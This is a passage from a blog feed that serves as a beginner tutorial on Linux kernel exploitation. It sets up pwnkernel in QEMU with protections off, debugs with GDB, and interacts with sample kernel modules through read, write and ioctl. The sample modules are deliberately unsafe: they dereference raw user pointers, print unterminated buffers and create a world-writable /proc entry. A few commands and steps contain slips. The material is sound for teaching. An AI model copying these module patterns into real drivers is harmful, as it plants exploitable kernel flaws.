&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://old.iseclab.org/projects/vifuzz/docs/exploit.pdf">iSecLab - Kernel-mode exploits primer&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:
Downloading and building specific Kernel versions. Streamlining the kernel module build process.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#debugging-in-the-kernel">Debugging in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#kernel-module-overview">Kernel Module Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#compiling-kernel-modules">Compiling Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#inserting-kernel-modules">Inserting Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-file-based-operations">Interacting with File-based Operations&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-ioctl">Interacting with IOCTL&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:&lt;/p>
&lt;ul>
&lt;li>Downloading and building specific Kernel versions.&lt;/li>
&lt;li>Streamlining the kernel module build process.&lt;/li>
&lt;li>Emulate specific kernel versions under the QEMU virtual machine.&lt;/li>
&lt;/ul>
&lt;p>Installation is pretty simple, just clone the repository and run the build script.&lt;/p>
&lt;pre>&lt;code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.
&lt;/code>&lt;/pre>&lt;p>You can optionally specify the kernel version you want to download and compile within the &lt;code>build.sh&lt;/code> script. By default it should be Linux version 5.4.0.&lt;/p>
&lt;pre>&lt;code>~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
&lt;/code>&lt;/pre>&lt;p>Running the virtual machine is equally simple, it&amp;rsquo;s as easy as executing the &lt;code>launch.sh&lt;/code> script. Note that the target kernel version is specified within this script. After executing we can see we&amp;rsquo;re dropped into a shell inside the virtual machine.&lt;/p>
&lt;p>Note: by defauled pwnkernel launches the emulator without any kernel space protections (e.g. kpti, smap, smep, etc).&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="debugging-in-the-kernel">Debugging in the Kernel&lt;/h2>
&lt;p>First launch the kernel virtual machine in a separate terminal window.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;p>Then we need to open &lt;code>pwnkernel/linux-5.4/vmlinux&lt;/code> with GDB and we&amp;rsquo;ll be able to debug the kernel as we see fit. This will allow us to resolve kernel symbols and view kernel memory.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ gdb linux-5.4/vmlinux
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from linux-5.4/vmlinux...
&lt;/code>&lt;/pre>&lt;p>By default the &lt;code>launch.sh&lt;/code> script will run QEMU with a gdbserver instance on port &lt;code>1234&lt;/code>. We can connect to this with the following command.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
&lt;/code>&lt;/pre>&lt;p>Then, debugging is almost identical to debugging any other binary - we can set breakpoints, step through code, etc. Keep in mind however, when the debugger is paused you will be unable to interact with the Kernel (i.e. enter any commands, etc) until you continue execution.&lt;/p>
&lt;h2 id="kernel-module-overview">Kernel Module Overview&lt;/h2>
&lt;p>Below is a code snippet containing the core parts of a kernel module. These include &lt;code>open&lt;/code>, &lt;code>release&lt;/code>, &lt;code>init_module&lt;/code>, and &lt;code>cleanup_module&lt;/code> functions.&lt;/p>
&lt;p>The &lt;code>init_module&lt;/code> function is called when the module is inserted into the kernel. It will typically create an entry under &amp;lsquo;/proc/&amp;rsquo; or &amp;lsquo;/dev/&amp;rsquo; that the user can interact with.&lt;/p>
&lt;p>The &lt;code>cleanup_module&lt;/code> function is called when the kernel module is removed from the kernel. It will typically remove whatever entry it created within the &lt;code>init_module&lt;/code> function logic.&lt;/p>
&lt;p>The &lt;code>open&lt;/code> function is called when the entry is opened for read/write operations. While the &lt;code>release&lt;/code> function is called when that entry is closed.&lt;/p>
&lt;p>The &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are also important for interacting with the kernel module, but more on these later.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// read from kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// write to kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is opened
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is released
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is inserted into the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is removed from the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>One way to create a kernel module entry is to utilise the &lt;code>register_chrdev&lt;/code> function. This will assign what is called a &amp;lsquo;major number&amp;rsquo; to the kernel module, allowing us to create a kernel module entry under the &amp;lsquo;/dev/&amp;rsquo; directory. The &lt;code>unregister_chrdev&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
major_number &lt;span style="color:#f92672">=&lt;/span> register_chrdev(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">if&lt;/span> (major_number &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> major_number;
printk(KERN_INFO &lt;span style="color:#e6db74">&amp;#34;create device with: &amp;#39;mknod /dev/challenge c %d 0&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, major_number);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
unregister_chrdev(major_number, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can create an entry in the &amp;lsquo;/dev/&amp;rsquo; directory with the command below.&lt;/p>
&lt;pre>&lt;code>/ # mknod /dev/&amp;lt;module name&amp;gt; c &amp;lt;major number&amp;gt; 0
&lt;/code>&lt;/pre>&lt;p>An even simpler way to initialise a kernel module entry is via the &lt;code>proc_create&lt;/code> function. It creates a kernel module entry under the &amp;lsquo;/proc/&amp;rsquo; directory. It does not require any further user input to set up. The &lt;code>proc_remove&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are often great for kernel module interaction, there is another utility that we can use if we need even greater control over our input, this being &lt;code>ioctl&lt;/code>.&lt;/p>
&lt;p>It takes two main arguments an &lt;code>ioctl_num&lt;/code> and an &lt;code>ioctl_param&lt;/code>, where the &lt;code>ioctl_num&lt;/code> can be used (for example) to specify various tasks, and the &lt;code>ioctl_param&lt;/code> can be used to provide something like a pointer to an array or struct.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">challenge_ioctl&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ioctl_num, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> ioctl_param)
{
&lt;span style="color:#75715e">// when interacted with via ioctl
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> challenge_ioctl,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="compiling-kernel-modules">Compiling Kernel Modules&lt;/h2>
&lt;p>As mentioned before, pwnkernel makes the process of compiling new kernel modules very simple. Just move your kernel module source code to the &amp;lsquo;src/&amp;rsquo; directory within pwnkernel. Make sure you update the makefile within the same &amp;lsquo;src/&amp;rsquo; directory, as this is what is used to compile your kernel module.&lt;/p>
&lt;p>See the below makefile for reference.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" />
&lt;label for="1">
&lt;span class="collapsable-code__language">makefile&lt;/span>
&lt;span class="collapsable-code__title">Makefile&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-makefile" >&lt;code>
# add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After updating the makefile, building a new kernel module is as simple as running the below commands.&lt;/p>
&lt;pre>&lt;code>~/ $ mv challenge.c ~/pwnkernel/src/challenge.c
~/ $ mv Makefile ~/pwnkernel/src/challenge.c
~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...
&lt;/code>&lt;/pre>&lt;h2 id="inserting-kernel-modules">Inserting Kernel Modules&lt;/h2>
&lt;p>Before you can interact with your freshly compiled kernel module, it needs to be inserted into the kernel itself. Below is a pre-written kernel module that will be used for the purposes of this exercise. Compile it and run the launch script to start.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Once we&amp;rsquo;ve compiled the above and started the kernel virtual machine, it&amp;rsquo;s as simple as running the &lt;code>insmod&lt;/code> command to insert the kernel module. There are other commands to do this such as &lt;code>modprobe&lt;/code>, which is better at resolving dependencies, but for this kernel module &lt;code>insmod&lt;/code> is sufficient.&lt;/p>
&lt;p>Running &lt;code>dmesg&lt;/code> we can see that the &lt;code>init_module&lt;/code> function was executed when we inserted the kernel module.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # dmesg
...
[ 8.437878] challenge: loading out-of-tree module taints kernel.
[ 8.445662] module '/proc/challenge' created
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-file-based-operations">Interacting with File-based Operations&lt;/h2>
&lt;p>The majority of user interaction with kernel modules is done via file-based operations. Once the kernel module entry has been opened, the module has function handlers for read and write operations. For the sake of simplicity, you can think of this as a kind of file-based socket.&lt;/p>
&lt;p>Interaction is performed first by opening the module entry. When you read from that open file descriptor the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler is called. When you write to the open file descriptor the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler is called.&lt;/p>
&lt;p>Below is a pre-written kernel module that can be used for this exercise.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char data[18] = &amp;#34;Here&amp;#39;s some data!&amp;#34;;
copy_to_user(buf, data, 18);
return 0;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char data[16];
copy_from_user(data, buf, 16);
printk(KERN_ALERT &amp;#34;Message: &amp;#39;%s&amp;#39;.\n&amp;#34;, data);
return 0;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>The below proof-of-concept code will do a few things to demonstrate how read / write actions are handled within the kernel module:&lt;/p>
&lt;ul>
&lt;li>It will first open the module entry with read/write access.&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a read, reading from the kernel module (calling its &lt;code>read&lt;/code> handler function).&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a write, writing to the kernel module (calling its &amp;lsquo;write` handler function).&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;div class="collapsable-code">
&lt;input id="4" type="checkbox" />
&lt;label for="4">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* perform a read */
char output[32];
read(fd, output, sizeof(char) * 32);
puts(output);
/* perform a write */
char input[32] = &amp;#34;Hello, World!&amp;#34;;
write(fd, input, sizeof(char) * 32);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s start by inserting the kernel module and running our demonstration code. Running &lt;code>dmesg&lt;/code> afterwards we can see the result of our read / write actions.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
Here's some data!
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.547802] challenge: loading out-of-tree module taints kernel.
[ 12.557454] module '/proc/challenge' created
[ 18.904788] device '/proc/challenge' opened
[ 18.909735] Message: 'Hello, World!'.
[ 18.911169] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-ioctl">Interacting with IOCTL&lt;/h2>
&lt;p>As mentioned before, ioctl can provide us with much greater control over the way we interact with the kernel. Below is an example kernel module that will perform different actions depending on the input provided.&lt;/p>
&lt;p>Here is a pre-written kernel module that you can use for this exercise.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="5" type="checkbox" checked />
&lt;label for="5">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
#define HELLO _IO(&amp;#39;p&amp;#39;, 1)
#define GOODBYE _IO(&amp;#39;p&amp;#39;, 2)
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened\n&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed\n&amp;#34;);
return 0;
}
static long challenge_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
{
if (ioctl_num == HELLO) {
printk(KERN_ALERT &amp;#34;Hello, %s!\n&amp;#34;, (char *)ioctl_param);
}
else if (ioctl_num == GOODBYE) {
printk(KERN_ALERT &amp;#34;Goodbye, %s!\n&amp;#34;, (char *)ioctl_param);
}
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.unlocked_ioctl = challenge_ioctl,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created\n&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed\n&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After compiling our kernel module we&amp;rsquo;ll want to check the values of &lt;code>HELLO&lt;/code> and &lt;code>GOODBYE&lt;/code>, so we can send them to the module via ioctl. We can see that &lt;code>HELLO = 0x7001&lt;/code> and &lt;code>GOODBYE = 0x7002&lt;/code>.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ objdump -d src/challenge.ko -M intel
...
000000000000001e &amp;lt;challenge_ioctl&amp;gt;:
1e: 41 54 push r12
20: 48 c7 c7 00 00 00 00 mov rdi,0x0
27: 49 89 d4 mov r12,rdx
2a: 55 push rbp
2b: 89 f5 mov ebp,esi
2d: e8 00 00 00 00 call 32 &amp;lt;challenge_ioctl+0x14&amp;gt;
32: 81 fd 01 70 00 00 cmp ebp,0x7001
38: 75 11 jne 4b &amp;lt;challenge_ioctl+0x2d&amp;gt;
3a: 4c 89 e6 mov rsi,r12
3d: 48 c7 c7 00 00 00 00 mov rdi,0x0
44: e8 00 00 00 00 call 49 &amp;lt;challenge_ioctl+0x2b&amp;gt;
49: eb 27 jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
4b: 81 fd 02 70 00 00 cmp ebp,0x7002
51: 75 11 jne 64 &amp;lt;challenge_ioctl+0x46&amp;gt;
53: 4c 89 e6 mov rsi,r12
56: 48 c7 c7 00 00 00 00 mov rdi,0x0
5d: e8 00 00 00 00 call 62 &amp;lt;challenge_ioctl+0x44&amp;gt;
62: eb 0e jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
64: 89 ee mov esi,ebp
66: 48 c7 c7 00 00 00 00 mov rdi,0x0
6d: e8 00 00 00 00 call 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
72: 31 c0 xor eax,eax
74: 5d pop rbp
75: 41 5c pop r12
77: c3 ret
...
&lt;/code>&lt;/pre>&lt;p>Below is an example interaction with the above kernel module, it&amp;rsquo;ll do several things:&lt;/p>
&lt;ul>
&lt;li>First it&amp;rsquo;ll open the kernel module entry with read/write access.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;div class="collapsable-code">
&lt;input id="6" type="checkbox" />
&lt;label for="6">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;
#define HELLO 0x7001
#define GOODBYE 0x7002
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* interact with ioctl here */
char name[7] = &amp;#34;Anvbis&amp;#34;;
ioctl(fd, HELLO, name);
ioctl(fd, GOODBYE, name);
/* close the device */
